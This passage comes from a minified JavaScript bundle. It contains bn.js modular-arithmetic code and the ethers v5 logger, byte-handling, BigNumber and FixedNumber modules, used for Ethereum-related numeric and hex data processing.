numbers"),this.red.add(this,b)},s.prototype.redIAdd=function(b){return i(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,b)},s.prototype.redSub=function(b){return i(this.red,"redSub works only with red numbers"),this.red.sub(this,b)},s.prototype.redISub=function(b){return i(this.red,"redISub works only with red numbers"),this.red.isub(this,b)},s.prototype.redShl=function(b){return i(this.red,"redShl works only with red numbers"),this.red.shl(this,b)},s.prototype.redMul=function(b){return i(this.red,"redMul works only with red numbers"),this.red._verify2(this,b),this.red.mul(this,b)},s.prototype.redIMul=function(b){return i(this.red,"redMul works only with red numbers"),this.red._verify2(this,b),this.red.imul(this,b)},s.prototype.redSqr=function(){return i(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},s.prototype.redISqr=function(){return i(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},s.prototype.redSqrt=function(){return i(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},s.prototype.redInvm=function(){return i(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},s.prototype.redNeg=function(){return i(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},s.prototype.redPow=function(b){return i(this.red&&!b.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,b)};var k={k256:null,p224:null,p192:null,p25519:null};function I(A,b){this.name=A,this.p=new s(b,16),this.n=this.p.bitLength(),this.k=new s(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}I.prototype._tmp=function(){var b=new s(null);return b.words=new Array(Math.ceil(this.n/13)),b},I.prototype.ireduce=function(b){var v=b,_;do this.split(v,this.tmp),v=this.imulK(v),v=v.iadd(this.tmp),_=v.bitLength();while(_>this.n);var O=_<this.n?-1:v.ucmp(this.p);return O===0?(v.words[0]=0,v.length=1):O>0?v.isub(this.p):v.strip!==void 0?v.strip():v._strip(),v},I.prototype.split=function(b,v){b.iushrn(this.n,0,v)},I.prototype.imulK=function(b){return b.imul(this.k)};function E(){I.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}n(E,I),E.prototype.split=function(b,v){for(var _=4194303,O=Math.min(b.length,9),D=0;D<O;D++)v.words[D]=b.words[D];if(v.length=O,b.length<=9){b.words[0]=0,b.length=1;return}var R=b.words[9];for(v.words[v.length++]=R&_,D=10;D<b.length;D++){var P=b.words[D]|0;b.words[D-10]=(P&_)<<4|R>>>22,R=P}R>>>=22,b.words[D-10]=R,R===0&&b.length>10?b.length-=10:b.length-=9},E.prototype.imulK=function(b){b.words[b.length]=0,b.words[b.length+1]=0,b.length+=2;for(var v=0,_=0;_<b.length;_++){var O=b.words[_]|0;v+=O*977,b.words[_]=v&67108863,v=O*64+(v/67108864|0)}return b.words[b.length-1]===0&&(b.length--,b.words[b.length-1]===0&&b.length--),b};function C(){I.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}n(C,I);function N(){I.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}n(N,I);function L(){I.call(this,"25519","7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")}n(L,I),L.prototype.imulK=function(b){for(var v=0,_=0;_<b.length;_++){var O=(b.words[_]|0)*19+v,D=O&67108863;O>>>=26,b.words[_]=D,v=O}return v!==0&&(b.words[b.length++]=v),b},s._prime=function(b){if(k[b])return k[b];var v;if(b==="k256")v=new E;else if(b==="p224")v=new C;else if(b==="p192")v=new N;else if(b==="p25519")v=new L;else throw new Error("Unknown prime "+b);return k[b]=v,v};function $(A){if(typeof A=="string"){var b=s._prime(A);this.m=b.p,this.prime=b}else i(A.gtn(1),"modulus must be greater than 1"),this.m=A,this.prime=null}$.prototype._verify1=function(b){i(b.negative===0,"red works only with positives"),i(b.red,"red works only with red numbers")},$.prototype._verify2=function(b,v){i((b.negative|v.negative)===0,"red works only with positives"),i(b.red&&b.red===v.red,"red works only with red numbers")},$.prototype.imod=function(b){return this.prime?this.prime.ireduce(b)._forceRed(this):(u(b,b.umod(this.m)._forceRed(this)),b)},$.prototype.neg=function(b){return b.isZero()?b.clone():this.m.sub(b)._forceRed(this)},$.prototype.add=function(b,v){this._verify2(b,v);var _=b.add(v);return _.cmp(this.m)>=0&&_.isub(this.m),_._forceRed(this)},$.prototype.iadd=function(b,v){this._verify2(b,v);var _=b.iadd(v);return _.cmp(this.m)>=0&&_.isub(this.m),_},$.prototype.sub=function(b,v){this._verify2(b,v);var _=b.sub(v);return _.cmpn(0)<0&&_.iadd(this.m),_._forceRed(this)},$.prototype.isub=function(b,v){this._verify2(b,v);var _=b.isub(v);return _.cmpn(0)<0&&_.iadd(this.m),_},$.prototype.shl=function(b,v){return this._verify1(b),this.imod(b.ushln(v))},$.prototype.imul=function(b,v){return this._verify2(b,v),this.imod(b.imul(v))},$.prototype.mul=function(b,v){return this._verify2(b,v),this.imod(b.mul(v))},$.prototype.isqr=function(b){return this.imul(b,b.clone())},$.prototype.sqr=function(b){return this.mul(b,b)},$.prototype.sqrt=function(b){if(b.isZero())return b.clone();var v=this.m.andln(3);if(i(v%2===1),v===3){var _=this.m.add(new s(1)).iushrn(2);return this.pow(b,_)}for(var O=this.m.subn(1),D=0;!O.isZero()&&O.andln(1)===0;)D++,O.iushrn(1);i(!O.isZero());var R=new s(1).toRed(this),P=R.redNeg(),B=this.m.subn(1).iushrn(1),M=this.m.bitLength();for(M=new s(2*M*M).toRed(this);this.pow(M,B).cmp(P)!==0;)M.redIAdd(P);for(var W=this.pow(M,O),K=this.pow(b,O.addn(1).iushrn(1)),q=this.pow(b,O),J=D;q.cmp(R)!==0;){for(var le=q,ae=0;le.cmp(R)!==0;ae++)le=le.redSqr();i(ae<J);var U=this.pow(W,new s(1).iushln(J-ae-1));K=K.redMul(U),W=U.redSqr(),q=q.redMul(W),J=ae}return K},$.prototype.invm=function(b){var v=b._invmp(this.m);return v.negative!==0?(v.negative=0,this.imod(v).redNeg()):this.imod(v)},$.prototype.pow=function(b,v){if(v.isZero())return new s(1).toRed(this);if(v.cmpn(1)===0)return b.clone();var _=4,O=new Array(1<<_);O[0]=new s(1).toRed(this),O[1]=b;for(var D=2;D<O.length;D++)O[D]=this.mul(O[D-1],b);var R=O[0],P=0,B=0,M=v.bitLength()%26;for(M===0&&(M=26),D=v.length-1;D>=0;D--){for(var W=v.words[D],K=M-1;K>=0;K--){var q=W>>K&1;if(R!==O[0]&&(R=this.sqr(R)),q===0&&P===0){B=0;continue}P<<=1,P|=q,B++,!(B!==_&&(D!==0||K!==0))&&(R=this.mul(R,O[P]),B=0,P=0)}M=26}return R},$.prototype.convertTo=function(b){var v=b.umod(this.m);return v===b?v.clone():v},$.prototype.convertFrom=function(b){var v=b.clone();return v.red=null,v},s.mont=function(b){return new y(b)};function y(A){$.call(this,A),this.shift=this.m.bitLength(),this.shift%26!==0&&(this.shift+=26-this.shift%26),this.r=new s(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}n(y,$),y.prototype.convertTo=function(b){return this.imod(b.ushln(this.shift))},y.prototype.convertFrom=function(b){var v=this.imod(b.mul(this.rinv));return v.red=null,v},y.prototype.imul=function(b,v){if(b.isZero()||v.isZero())return b.words[0]=0,b.length=1,b;var _=b.imul(v),O=_.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),D=_.isub(O).iushrn(this.shift),R=D;return D.cmp(this.m)>=0?R=D.isub(this.m):D.cmpn(0)<0&&(R=D.iadd(this.m)),R._forceRed(this)},y.prototype.mul=function(b,v){if(b.isZero()||v.isZero())return new s(0)._forceRed(this);var _=b.mul(v),O=_.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),D=_.isub(O).iushrn(this.shift),R=D;return D.cmp(this.m)>=0?R=D.isub(this.m):D.cmpn(0)<0&&(R=D.iadd(this.m)),R._forceRed(this)},y.prototype.invm=function(b){var v=this.imod(b._invmp(this.m).mul(this.r2));return v._forceRed(this)}})(r,kae)}(j8)),j8.exports}var Pae=Nae();const pr=Ss(Pae),$ae="logger/5.8.0";let FB=!1,qB=!1;const F8={debug:1,default:2,info:2,warning:3,error:4,off:5};let zB=F8.default,OE=null;function Rae(){try{const r=[];if(["NFD","NFC","NFKD","NFKC"].forEach(e=>{try{if("test".normalize(e)!=="test")throw new Error("bad normalize")}catch{r.push(e)}}),r.length)throw new Error("missing "+r.join(", "));if("".normalize("NFD")!=="e")throw new Error("broken implementation")}catch(r){return r.message}return null}const WB=Rae();var $9;(function(r){r.DEBUG="DEBUG",r.INFO="INFO",r.WARNING="WARNING",r.ERROR="ERROR",r.OFF="OFF"})($9||($9={}));var Jc;(function(r){r.UNKNOWN_ERROR="UNKNOWN_ERROR",r.NOT_IMPLEMENTED="NOT_IMPLEMENTED",r.UNSUPPORTED_OPERATION="UNSUPPORTED_OPERATION",r.NETWORK_ERROR="NETWORK_ERROR",r.SERVER_ERROR="SERVER_ERROR",r.TIMEOUT="TIMEOUT",r.BUFFER_OVERRUN="BUFFER_OVERRUN",r.NUMERIC_FAULT="NUMERIC_FAULT",r.MISSING_NEW="MISSING_NEW",r.INVALID_ARGUMENT="INVALID_ARGUMENT",r.MISSING_ARGUMENT="MISSING_ARGUMENT",r.UNEXPECTED_ARGUMENT="UNEXPECTED_ARGUMENT",r.CALL_EXCEPTION="CALL_EXCEPTION",r.INSUFFICIENT_FUNDS="INSUFFICIENT_FUNDS",r.NONCE_EXPIRED="NONCE_EXPIRED",r.REPLACEMENT_UNDERPRICED="REPLACEMENT_UNDERPRICED",r.UNPREDICTABLE_GAS_LIMIT="UNPREDICTABLE_GAS_LIMIT",r.TRANSACTION_REPLACED="TRANSACTION_REPLACED",r.ACTION_REJECTED="ACTION_REJECTED"})(Jc||(Jc={}));const HB="0123456789abcdef";class be{constructor(e){Object.defineProperty(this,"version",{enumerable:!0,value:e,writable:!1})}_log(e,t){const i=e.toLowerCase();F8[i]==null&&this.throwArgumentError("invalid log level name","logLevel",e),!(zB>F8[i])&&console.log.apply(console,t)}debug(...e){this._log(be.levels.DEBUG,e)}info(...e){this._log(be.levels.INFO,e)}warn(...e){this._log(be.levels.WARNING,e)}makeError(e,t,i){if(qB)return this.makeError("censored error",t,{});t||(t=be.errors.UNKNOWN_ERROR),i||(i={});const n=[];Object.keys(i).forEach(c=>{const l=i[c];try{if(l instanceof Uint8Array){let u="";for(let d=0;d<l.length;d++)u+=HB[l[d]>>4],u+=HB[l[d]&15];n.push(c+"=Uint8Array(0x"+u+")")}else n.push(c+"="+JSON.stringify(l))}catch{n.push(c+"="+JSON.stringify(i[c].toString()))}}),n.push(`code=${t}`),n.push(`version=${this.version}`);const s=e;let o="";switch(t){case Jc.NUMERIC_FAULT:{o="NUMERIC_FAULT";const c=e;switch(c){case"overflow":case"underflow":case"division-by-zero":o+="-"+c;break;case"negative-power":case"negative-width":o+="-unsupported";break;case"unbound-bitwise-result":o+="-unbound-result";break}break}case Jc.CALL_EXCEPTION:case Jc.INSUFFICIENT_FUNDS:case Jc.MISSING_NEW:case Jc.NONCE_EXPIRED:case Jc.REPLACEMENT_UNDERPRICED:case Jc.TRANSACTION_REPLACED:case Jc.UNPREDICTABLE_GAS_LIMIT:o=t;break}o&&(e+=" [ See: https://links.ethers.org/v5-errors-"+o+" ]"),n.length&&(e+=" ("+n.join(", ")+")");const a=new Error(e);return a.reason=s,a.code=t,Object.keys(i).forEach(function(c){a[c]=i[c]}),a}throwError(e,t,i){throw this.makeError(e,t,i)}throwArgumentError(e,t,i){return this.throwError(e,be.errors.INVALID_ARGUMENT,{argument:t,value:i})}assert(e,t,i,n){e||this.throwError(t,i,n)}assertArgument(e,t,i,n){e||this.throwArgumentError(t,i,n)}checkNormalize(e){WB&&this.throwError("platform missing String.prototype.normalize",be.errors.UNSUPPORTED_OPERATION,{operation:"String.prototype.normalize",form:WB})}checkSafeUint53(e,t){typeof e=="number"&&(t==null&&(t="value not safe"),(e<0||e>=9007199254740991)&&this.throwError(t,be.errors.NUMERIC_FAULT,{operation:"checkSafeInteger",fault:"out-of-safe-range",value:e}),e%1&&this.throwError(t,be.errors.NUMERIC_FAULT,{operation:"checkSafeInteger",fault:"non-integer",value:e}))}checkArgumentCount(e,t,i){i?i=": "+i:i="",e<t&&this.throwError("missing argument"+i,be.errors.MISSING_ARGUMENT,{count:e,expectedCount:t}),e>t&&this.throwError("too many arguments"+i,be.errors.UNEXPECTED_ARGUMENT,{count:e,expectedCount:t})}checkNew(e,t){(e===Object||e==null)&&this.throwError("missing new",be.errors.MISSING_NEW,{name:t.name})}checkAbstract(e,t){e===t?this.throwError("cannot instantiate abstract class "+JSON.stringify(t.name)+" directly; use a sub-class",be.errors.UNSUPPORTED_OPERATION,{name:e.name,operation:"new"}):(e===Object||e==null)&&this.throwError("missing new",be.errors.MISSING_NEW,{name:t.name})}static globalLogger(){return OE||(OE=new be($ae)),OE}static setCensorship(e,t){if(!e&&t&&this.globalLogger().throwError("cannot permanently disable censorship",be.errors.UNSUPPORTED_OPERATION,{operation:"setCensorship"}),FB){if(!e)return;this.globalLogger().throwError("error censorship permanent",be.errors.UNSUPPORTED_OPERATION,{operation:"setCensorship"})}qB=!!e,FB=!!t}static setLogLevel(e){const t=F8[e.toLowerCase()];if(t==null){be.globalLogger().warn("invalid log level - "+e);return}zB=t}static from(e){return new be(e)}}be.errors=Jc;be.levels=$9;const Oae=Object.freeze(Object.defineProperty({__proto__:null,get ErrorCode(){return Jc},get LogLevel(){return $9},Logger:be},Symbol.toStringTag,{value:"Module"})),Bae="bytes/5.8.0",Ln=new be(Bae);function rZ(r){return!!r.toHexString}function ew(r){return r.slice||(r.slice=function(){const e=Array.prototype.slice.call(arguments);return ew(new Uint8Array(Array.prototype.slice.apply(r,e)))}),r}function Vy(r){return Jr(r)&&!(r.length%2)||Hg(r)}function VB(r){return typeof r=="number"&&r==r&&r%1===0}function Hg(r){if(r==null)return!1;if(r.constructor===Uint8Array)return!0;if(typeof r=="string"||!VB(r.length)||r.length<0)return!1;for(let e=0;e<r.length;e++){const t=r[e];if(!VB(t)||t<0||t>=256)return!1}return!0}function ze(r,e){if(e||(e={}),typeof r=="number"){Ln.checkSafeUint53(r,"invalid arrayify value");const t=[];for(;r;)t.unshift(r&255),r=parseInt(String(r/256));return t.length===0&&t.push(0),ew(new Uint8Array(t))}if(e.allowMissingPrefix&&typeof r=="string"&&r.substring(0,2)!=="0x"&&(r="0x"+r),rZ(r)&&(r=r.toHexString()),Jr(r)){let t=r.substring(2);t.length%2&&(e.hexPad==="left"?t="0"+t:e.hexPad==="right"?t+="0":Ln.throwArgumentError("hex data is odd-length","value",r));const i=[];for(let n=0;n<t.length;n+=2)i.push(parseInt(t.substring(n,n+2),16));return ew(new Uint8Array(i))}return Hg(r)?ew(new Uint8Array(r)):Ln.throwArgumentError("invalid arrayify value","value",r)}function cn(r){const e=r.map(n=>ze(n)),t=e.reduce((n,s)=>n+s.length,0),i=new Uint8Array(t);return e.reduce((n,s)=>(i.set(s,n),n+s.length),0),ew(i)}function bd(r){let e=ze(r);if(e.length===0)return e;let t=0;for(;t<e.length&&e[t]===0;)t++;return t&&(e=e.slice(t)),e}function g5(r,e){r=ze(r),r.length>e&&Ln.throwArgumentError("value out of range","value",arguments[0]);const t=new Uint8Array(e);return t.set(r,e-r.length),ew(t)}function Jr(r,e){return!(typeof r!="string"||!r.match(/^0x[0-9A-Fa-f]*$/)||e&&r.length!==2+2*e)}const BE="0123456789abcdef";function Qe(r,e){if(e||(e={}),typeof r=="number"){Ln.checkSafeUint53(r,"invalid hexlify value");let t="";for(;r;)t=BE[r&15]+t,r=Math.floor(r/16);return t.length?(t.length%2&&(t="0"+t),"0x"+t):"0x00"}if(typeof r=="bigint")return r=r.toString(16),r.length%2?"0x0"+r:"0x"+r;if(e.allowMissingPrefix&&typeof r=="string"&&r.substring(0,2)!=="0x"&&(r="0x"+r),rZ(r))return r.toHexString();if(Jr(r))return r.length%2&&(e.hexPad==="left"?r="0x0"+r.substring(2):e.hexPad==="right"?r+="0":Ln.throwArgumentError("hex data is odd-length","value",r)),r.toLowerCase();if(Hg(r)){let t="0x";for(let i=0;i<r.length;i++){let n=r[i];t+=BE[(n&240)>>4]+BE[n&15]}return t}return Ln.throwArgumentError("invalid hexlify value","value",r)}function Ad(r){if(typeof r!="string")r=Qe(r);else if(!Jr(r)||r.length%2)return null;return(r.length-2)/2}function Nn(r,e,t){return typeof r!="string"?r=Qe(r):(!Jr(r)||r.length%2)&&Ln.throwArgumentError("invalid hexData","value",r),e=2+2*e,t!=null?"0x"+r.substring(e,2+2*t):"0x"+r.substring(e)}function Wo(r){let e="0x";return r.forEach(t=>{e+=Qe(t).substring(2)}),e}function Ky(r){const e=iZ(Qe(r,{hexPad:"left"}));return e==="0x"?"0x0":e}function iZ(r){typeof r!="string"&&(r=Qe(r)),Jr(r)||Ln.throwArgumentError("invalid hex string","value",r),r=r.substring(2);let e=0;for(;e<r.length&&r[e]==="0";)e++;return"0x"+r.substring(e)}function Xi(r,e){for(typeof r!="string"?r=Qe(r):Jr(r)||Ln.throwArgumentError("invalid hex string","value",r),r.length>2*e+2&&Ln.throwArgumentError("value out of range","value",arguments[1]);r.length<2*e+2;)r="0x0"+r.substring(2);return r}function Vg(r){const e={r:"0x",s:"0x",_vs:"0x",recoveryParam:0,v:0,yParityAndS:"0x",compact:"0x"};if(Vy(r)){let t=ze(r);t.length===64?(e.v=27+(t[32]>>7),t[32]&=127,e.r=Qe(t.slice(0,32)),e.s=Qe(t.slice(32,64))):t.length===65?(e.r=Qe(t.slice(0,32)),e.s=Qe(t.slice(32,64)),e.v=t[64]):Ln.throwArgumentError("invalid signature string","signature",r),e.v<27&&(e.v===0||e.v===1?e.v+=27:Ln.throwArgumentError("signature invalid v byte","signature",r)),e.recoveryParam=1-e.v%2,e.recoveryParam&&(t[32]|=128),e._vs=Qe(t.slice(32,64))}else{if(e.r=r.r,e.s=r.s,e.v=r.v,e.recoveryParam=r.recoveryParam,e._vs=r._vs,e._vs!=null){const n=g5(ze(e._vs),32);e._vs=Qe(n);const s=n[0]>=128?1:0;e.recoveryParam==null?e.recoveryParam=s:e.recoveryParam!==s&&Ln.throwArgumentError("signature recoveryParam mismatch _vs","signature",r),n[0]&=127;const o=Qe(n);e.s==null?e.s=o:e.s!==o&&Ln.throwArgumentError("signature v mismatch _vs","signature",r)}if(e.recoveryParam==null)e.v==null?Ln.throwArgumentError("signature missing v and recoveryParam","signature",r):e.v===0||e.v===1?e.recoveryParam=e.v:e.recoveryParam=1-e.v%2;else if(e.v==null)e.v=27+e.recoveryParam;else{const n=e.v===0||e.v===1?e.v:1-e.v%2;e.recoveryParam!==n&&Ln.throwArgumentError("signature recoveryParam mismatch v","signature",r)}e.r==null||!Jr(e.r)?Ln.throwArgumentError("signature missing or invalid r","signature",r):e.r=Xi(e.r,32),e.s==null||!Jr(e.s)?Ln.throwArgumentError("signature missing or invalid s","signature",r):e.s=Xi(e.s,32);const t=ze(e.s);t[0]>=128&&Ln.throwArgumentError("signature s out of range","signature",r),e.recoveryParam&&(t[0]|=128);const i=Qe(t);e._vs&&(Jr(e._vs)||Ln.throwArgumentError("signature invalid _vs","signature",r),e._vs=Xi(e._vs,32)),e._vs==null?e._vs=i:e._vs!==i&&Ln.throwArgumentError("signature _vs mismatch v and s","signature",r)}return e.yParityAndS=e._vs,e.compact=e.r+e.yParityAndS.substring(2),e}function qT(r){return r=Vg(r),Qe(cn([r.r,r.s,r.recoveryParam?"0x1c":"0x1b"]))}const Mae=Object.freeze(Object.defineProperty({__proto__:null,arrayify:ze,concat:cn,hexConcat:Wo,hexDataLength:Ad,hexDataSlice:Nn,hexStripZeros:iZ,hexValue:Ky,hexZeroPad:Xi,hexlify:Qe,isBytes:Hg,isBytesLike:Vy,isHexString:Jr,joinSignature:qT,splitSignature:Vg,stripZeros:bd,zeroPad:g5},Symbol.toStringTag,{value:"Module"})),nZ="bignumber/5.8.0";var ev=pr.BN;const Bh=new be(nZ),ME={},KB=9007199254740991;function Dae(r){return r!=null&&(Ge.isBigNumber(r)||typeof r=="number"&&r%1===0||typeof r=="string"&&!!r.match(/^-?[0-9]+$/)||Jr(r)||typeof r=="bigint"||Hg(r))}let GB=!1;class Ge{constructor(e,t){e!==ME&&Bh.throwError("cannot call constructor directly; use BigNumber.from",be.errors.UNSUPPORTED_OPERATION,{operation:"new (BigNumber)"}),this._hex=t,this._isBigNumber=!0,Object.freeze(this)}fromTwos(e){return sa(zr(this).fromTwos(e))}toTwos(e){return sa(zr(this).toTwos(e))}abs(){return this._hex[0]==="-"?Ge.from(this._hex.substring(1)):this}add(e){return sa(zr(this).add(zr(e)))}sub(e){return sa(zr(this).sub(zr(e)))}div(e){return Ge.from(e).isZero()&&Rc("division-by-zero","div"),sa(zr(this).div(zr(e)))}mul(e){return sa(zr(this).mul(zr(e)))}mod(e){const t=zr(e);return t.isNeg()&&Rc("division-by-zero","mod"),sa(zr(this).umod(t))}pow(e){const t=zr(e);return t.isNeg()&&Rc("negative-power","pow"),sa(zr(this).pow(t))}and(e){const t=zr(e);return(this.isNegative()||t.isNeg())&&Rc("unbound-bitwise-result","and"),sa(zr(this).and(t))}or(e){const t=zr(e);return(this.isNegative()||t.isNeg())&&Rc("unbound-bitwise-result","or"),sa(zr(this).or(t))}xor(e){const t=zr(e);return(this.isNegative()||t.isNeg())&&Rc("unbound-bitwise-result","xor"),sa(zr(this).xor(t))}mask(e){return(this.isNegative()||e<0)&&Rc("negative-width","mask"),sa(zr(this).maskn(e))}shl(e){return(this.isNegative()||e<0)&&Rc("negative-width","shl"),sa(zr(this).shln(e))}shr(e){return(this.isNegative()||e<0)&&Rc("negative-width","shr"),sa(zr(this).shrn(e))}eq(e){return zr(this).eq(zr(e))}lt(e){return zr(this).lt(zr(e))}lte(e){return zr(this).lte(zr(e))}gt(e){return zr(this).gt(zr(e))}gte(e){return zr(this).gte(zr(e))}isNegative(){return this._hex[0]==="-"}isZero(){return zr(this).isZero()}toNumber(){try{return zr(this).toNumber()}catch{Rc("overflow","toNumber",this.toString())}return null}toBigInt(){try{return BigInt(this.toString())}catch{}return Bh.throwError("this platform does not support BigInt",be.errors.UNSUPPORTED_OPERATION,{value:this.toString()})}toString(){return arguments.length>0&&(arguments[0]===10?GB||(GB=!0,Bh.warn("BigNumber.toString does not accept any parameters; base-10 is assumed")):arguments[0]===16?Bh.throwError("BigNumber.toString does not accept any parameters; use bigNumber.toHexString()",be.errors.UNEXPECTED_ARGUMENT,{}):Bh.throwError("BigNumber.toString does not accept parameters",be.errors.UNEXPECTED_ARGUMENT,{})),zr(this).toString(10)}toHexString(){return this._hex}toJSON(e){return{type:"BigNumber",hex:this.toHexString()}}static from(e){if(e instanceof Ge)return e;if(typeof e=="string")return e.match(/^-?0x[0-9a-f]+$/i)?new Ge(ME,tv(e)):e.match(/^-?[0-9]+$/)?new Ge(ME,tv(new ev(e))):Bh.throwArgumentError("invalid BigNumber string","value",e);if(typeof e=="number")return e%1&&Rc("underflow","BigNumber.from",e),(e>=KB||e<=-KB)&&Rc("overflow","BigNumber.from",e),Ge.from(String(e));const t=e;if(typeof t=="bigint")return Ge.from(t.toString());if(Hg(t))return Ge.from(Qe(t));if(t)if(t.toHexString){const i=t.toHexString();if(typeof i=="string")return Ge.from(i)}else{let i=t._hex;if(i==null&&t.type==="BigNumber"&&(i=t.hex),typeof i=="string"&&(Jr(i)||i[0]==="-"&&Jr(i.substring(1))))return Ge.from(i)}return Bh.throwArgumentError("invalid BigNumber value","value",e)}static isBigNumber(e){return!!(e&&e._isBigNumber)}}function tv(r){if(typeof r!="string")return tv(r.toString(16));if(r[0]==="-")return r=r.substring(1),r[0]==="-"&&Bh.throwArgumentError("invalid hex","value",r),r=tv(r),r==="0x00"?r:"-"+r;if(r.substring(0,2)!=="0x"&&(r="0x"+r),r==="0x")return"0x00";for(r.length%2&&(r="0x0"+r.substring(2));r.length>4&&r.substring(0,4)==="0x00";)r="0x"+r.substring(4);return r}function sa(r){return Ge.from(tv(r))}function zr(r){const e=Ge.from(r).toHexString();return e[0]==="-"?new ev("-"+e.substring(3),16):new ev(e.substring(2),16)}function Rc(r,e,t){const i={fault:r,operation:e};return t!=null&&(i.value=t),Bh.throwError(r,be.errors.NUMERIC_FAULT,i)}function Lae(r){return new ev(r,36).toString(16)}function Uae(r){return new ev(r,16).toString(36)}const Ho=new be(nZ),m5={},sZ=Ge.from(0),oZ=Ge.from(-1);function aZ(r,e,t,i){const n={fault:e,operation:t};return i!==void 0&&(n.value=i),Ho.throwError(r,be.errors.NUMERIC_FAULT,n)}let w5="0";for(;w5.length<256;)w5+=w5;function s$(r){if(typeof r!="number")try{r=Ge.from(r).toNumber()}catch{}return typeof r=="number"&&r>=0&&r<=256&&!(r%1)?"1"+w5.substring(0,r):Ho.throwArgumentError("invalid decimal size","decimals",r)}function q8(r,e){e==null&&(e=0);const t=s$(e);r=Ge.from(r);const i=r.lt(sZ);i&&(r=r.mul(oZ));let n=r.mod(t).toString();for(;n.length<t.length-1;)n="0"+n;n=n.match(/^([0-9]*[1-9]|0)(0*)/)[1];const s=r.div(t).toString();return t.length===1?r=s:r=s+"."+n,i&&(r="-"+r),r}function Xu(r,e){e==null&&(e=0);const t=s$(e);(typeof r!="string"||!r.match(/^-?[0-9.]+$/))&&Ho.throwArgumentError("invalid decimal value","value",r);const i=r.substring(0,1)==="-";i&&(r=r.substring(1)),r==="."&&Ho.throwArgumentError("missing value","value",r);const n=r.split(".");n.length>2&&Ho.throwArgumentError("too many decimal points","value",r);let s=n[0],o=n[1];for(s||(s="0"),o||(o="0");o[o.length-1]==="0";)o=o.substring(0,o.length-1);for(o.length>t.length-1&&aZ("fractional component exceeds decimals","underflow","parseFixed"),o===""&&(o="0");o.length<t.length-1;)o+="0";const a=Ge.from(s),c=Ge.from(o);let l=a.mul(t).add(c);return i&&(l=l.mul(oZ)),l}class tw{constructor(e,t,i,n){e!==m5&&Ho.throwError("cannot use FixedFormat constructor; use FixedFormat.from",be.errors.UNSUPPORTED_OPERATION,{operation:"new FixedFormat"}),this.signed=t,this.width=i,this.decimals=n,this.name=(t?"":"u")+"fixed"+String(i)+"x"+String(n),this._multiplier=s$(n),Object.freeze(this)}static from(e){if(e instanceof tw)return e;typeof e=="number"&&(e=`fixed128x${e}`);let t=!0,i=128,n=18;if(typeof e=="string"){if(e!=="fixed")if(e==="ufixed")t=!1;else{const s=e.match(/^(u?)fixed([0-9]+)x([0-9]+)$/);s||Ho.throwArgumentError("invalid fixed format","format",e),t=s[1]!=="u",i=parseInt(s[2]),n=parseInt(s[3])}}else if(e){const s=(o,a,c)=>e[o]==null?c:(typeof e[o]!==a&&Ho.throwArgumentError("invalid fixed format ("+o+" not "+a+")","format."+o,e[o]),e[o]);t=s("signed","boolean",t),i=s("width","number",i),n=s("decimals","number",n)}return i%8&&Ho.throwArgumentError("invalid fixed format width (not byte aligned)","format.width",i),n>80&&Ho.throwArgumentError("invalid fixed format (decimals too large)","format.decimals",n),new tw(m5,t,i,n)}}class io{constructor(e,t,i,n){e!==m5&&Ho.throwError("cannot use FixedNumber constructor; use FixedNumber.from",be.errors.UNSUPPORTED_OPERATION,{operation:"new FixedFormat"}),this.format=n,this._hex=t,this._value=i,this._isFixedNumber=!0,Object.freeze(this)}_checkFormat(e){this.format.name!==e.format.name&&Ho.throwArgumentError("incompatible format; use fixedNumber.toFormat","other",e)}addUnsafe(e){this._checkFormat(e);const t=Xu(this._value,this.format.decimals),i=Xu(e._value,e.format.decimals);return io.fromValue(t.add(i),this.format.decimals,this.format)}subUnsafe(e){this._checkFormat(e);const t=Xu(this._value,this.format.decimals),i=Xu(e._value,e.format.decimals);return io.fromValue(t.sub(i),this.format.decimals,this.format)}mulUnsafe(e){this._checkFormat(e);const t=Xu(this._value,this.format.decimals),i=Xu(e._value,e.format.decimals);return io.fromValue(t.mul(i).div(this.format._multiplier),this.format.decimals,this.format)}divUnsafe(e){this._checkFormat(e);const t=Xu(this._value,this.format.decimals),i=Xu(e._value,e.format.decimals);return io.fromValue(t.mul(this.format._multiplier).div(i),this.format.decimals,this.format)}floor(){const e=this.toString().split(".");e.length===1&&e.push("0");let t=io.from(e[0],this.format);const i=!e[1].match(/^(0*)$/);return this.isNegative()&&i&&(t=t.subUnsafe(ZB.toFormat(t.format))),t}ceiling(){const e=this.toString().split(".");e.length===1&&e.push("0");let t=io.from(e[0],this.format);const i=!e[1].match(/^(0*)$/);return!this.isNegative()&&i&&(t=t.addUnsafe(ZB.toFormat(t.format))),t}round(e){e==null&&(e=0);const t=this.toString().split(".");if(t.length===1&&t.push("0"),(e<0||e>80||e%1)&&Ho.throwArgumentError("invalid decimal count","decimals",e),t[1].length<=e)return this;const i=io.from("1"+w5.substring(0,e),this.format),n=jae.toFormat(this.format);return this.mulUnsafe(i).addUnsafe(n).floor().divUnsafe(i)}isZero(){return this._value==="0.0"||this._value==="0"}isNegative(){return this._value[0]==="-"}toString(){return this._value}toHexString(e){if(e==null)return this._hex;e%8&&Ho.throwArgumentError("invalid byte width","width",e);const t=Ge.from(this._hex).fromTwos(this.format.width).toTwos(e).toHexString();return Xi(t,e/8)}toUnsafeFloat(){return parseFloat(this.toString())}toFormat(e){return io.fromString(this._value,e)}static fromValue(e,t,i){return i==null&&t!=null&&!Dae(t)&&(i=t,t=null),t==null&&(t=0),i==null&&(i="fixed"),io.fromString(q8(e,t),tw.from(i))}static 